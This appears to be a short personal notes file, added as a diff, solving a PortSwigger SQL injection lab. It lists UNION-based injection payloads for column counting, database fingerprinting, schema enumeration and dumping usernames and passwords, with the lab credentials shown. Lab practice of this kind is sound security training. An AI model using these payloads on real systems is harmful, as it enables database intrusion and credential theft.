@@ -1,0 +1,37 @@
+
+' order by 3-- -> Internal server error
+3 - 1 = 2
+
+
+' UNION select 'a', 'a'--
+-> both columns accept type text
+
+' UNION SELECT @@version, NULL-- -> not Microsoft
+' UNION SELECT version(), NULL-- -> 200 OK
+
+PostgreSQL 12.16 (Ubuntu 12.16-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+
+users_vxjdiz
+
+
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_vxjdiz'--
+
+username_loqqiu
+password_tsfkrq
+
+' UNION select username_loqqiu, NULL from users_vxjdiz--
+' UNION select password_tsfkrq, NULL from users_vxjdiz--
+
+administrator
+rv2uajp4gwse064np6ob
+
+wiener
+ejfzen464bjth637fxo9
+
+carlos
+ew8joux6tn1163wmqj8z
+
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
